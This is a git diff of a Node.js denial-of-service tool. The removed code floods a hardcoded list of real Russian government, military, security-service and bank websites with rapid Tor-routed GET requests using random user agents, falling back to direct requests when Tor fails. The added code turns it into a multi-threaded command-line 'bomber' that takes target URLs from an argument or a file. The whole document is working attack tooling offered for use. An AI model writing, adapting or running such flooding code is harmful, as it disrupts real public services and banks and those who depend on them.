@@ -1,56 +1,92 @@
-const tor = require('tor-request');
-const request = require('request');
-const randomUseragent = require('random-useragent');
-const { execFile } = require('child_process');
+#!/usr/bin/env node
+const { docopt } =      require('docopt');
+const { execFile } =    require('child_process');
+const fs =              require('fs').promises;
+const { Worker } =      require('worker_threads');
 
-function sendRequestWithoutProxy(url) {
-    request({
-        url,
-        method: 'GET',
-        headers: {
-            'User-Agent': randomUseragent.getRandom()
-        }
-    }, (err, res) => {
-        if (err) console.log(err.message);
-        if (res?.statusCode) console.log(res.statusCode);
-    });
-}
 
-const child = execFile('tor', (error) => {
-  if (error) throw error;
-});
+const state = {};
 
-const urls = ["http://duma.gov.ru/", "https://109.207.1.118/", "https://109.207.1.97/", "https://www.nalog.gov.ru", "https://www.sberbank.ru/", "https://www.vtb.ru", "https://www.gazprombank.ru/", "http://president-sovet.ru/", "https://mil.ru/", "https://sovetnational.ru/", "https://www.gosuslugi.ru/ru/", "https://zakupki.gov.ru/epz/main/public/home.html", "https://gossluzhba.gov.ru/", "http://defence.council.gov.ru/", "http://budget.council.gov.ru/", "http://www.kremlin.ru/", "https://government.ru/", "http://www.scrf.gov.ru/", "http://www.ksrf.ru/ru/Pages/default.aspx", "http://www.vsrf.ru/", "http://premier.gov.ru/events/", "https://www.mchs.gov.ru/dokumenty/federalnye-zakony", "https://minjust.gov.ru/ru/", "http://www.fsb.ru/", "https://rosguard.gov.ru/", "https://customs.gov.ru/", "https://udprf.ru/", "http://favt.gov.ru/"]
+const doc = `Usage:
+    ./index.js -h | --help
+    ./index.js [-u | --url <url>] [-t | --threads <threads>]
+    ./index.js [-f | --file <filepath>] [-t | --threads <threads>]
+     
 
-child.stdout.on('data', async (data)=>{
-    if (data.includes('Bootstrapped 100% (done): Done')) {
-        try {
-            setInterval(() => {
-                try {
-                    urls.forEach(url => {
-                        tor.request({
-                            url,
-                            method: 'GET',
-                            headers: {
-                                'User-Agent': randomUseragent.getRandom()
-                            }
-                        }, (err, res) => {
-                            if (err) {
-                                console.log(err.message);
-                                sendRequestWithoutProxy(url)
-                            }
-                            if (res?.statusCode) console.log(res.statusCode);
-                        })
-                    })
-                } catch(err) {
-                    console.log(err.message)
-                }
-            })
-        } catch(err){
-            console.log(err.message)
+Options:
+    -h --help          Show this screen
+    -t --threads       count of threads
+    -u --url           url to use
+    -f --file          path to file with urls
+`;
+
+async function waitForTor(){
+    return new Promise((resolve, reject) => {
+        const { stdout } = execFile('tor', (error) => {
+            if (error) reject(error);
+        });
+    
+        stdout.on('data', (data) => {
+            if (data.includes('Bootstrapped 100% (done): Done')) {
+                console.log('Bootstrapped 100% (done): Done');
+                resolve(true)
+            };
+        })
+    })
+};
+
+function setState({url, success}){
+    if (state[url]?.[success]) state[url][success] += 1;
+    else {
+        state[url] = {
+            ...state[url],
+            [success]: 1
         }
     }
-})
+    console.clear()
+    console.log(JSON.parse(JSON.stringify(state)));
+}
+
+async function parseFile(filepath){
+    const data = (await fs.readFile(filepath, 'utf8')).split('\n');
+
+    return data;
+}
+
+function startBombarding(urls, threads){
+    try {
+        if (!threads) new Worker(`${__dirname}/bomber.js`, { workerData: { urls } }).on('message', setState);
+
+        for (let i = 0; i < threads; i++) {
+            new Worker(`${__dirname}/bomber.js`, {
+                workerData: { urls }
+            }).on('message', setState);
+        }
+
+    } catch(err) {
+        console.log(err);
+    }
+}
+
+
+(async () => {
+    const {
+        '<threads>'   : threads,
+        '<url>'       : url,
+        '<filepath>'  : filepath
+
+    } = docopt(doc);
+    
+    let urls;
+    
+    await waitForTor();
+
+    if (filepath) urls = await parseFile(filepath);
+    if (url) urls = [ url ];
+
+    startBombarding(urls, threads)
+
+})();
 
 
 
